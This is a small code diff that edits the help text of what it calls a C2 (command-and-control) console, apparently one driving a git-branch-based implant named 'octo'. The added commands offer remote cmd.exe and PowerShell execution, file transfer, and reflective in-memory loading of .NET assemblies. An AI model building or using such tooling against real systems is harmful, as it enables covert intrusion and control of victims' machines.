@@ -177,11 +177,14 @@ class Repo:
         help_message = '''
             Commands:
                 - branch <branch_name>      Switch to new branch
-                - use <branch_name>         Switch to new branch
+                - octo <branch_name>        Switch to new branch
                 - help                      That's me :)
-                - help <cmd>                Help for specific command
                 - exit                      Exit C2
                 - upload <file_path>        Upload local file to branch & send to octo
+                - download <file_name>      Download a file from srv/
+                - cmd <command>             Runs <command> with cmd.exe
+                - powershell <command>      Runs <command> with powershell.exe
+                - ex-asm <.NET ASM> <args>  Downloads .NET assembly from srv/ and runs reflectively in memory
         '''
         print(help_message)
 
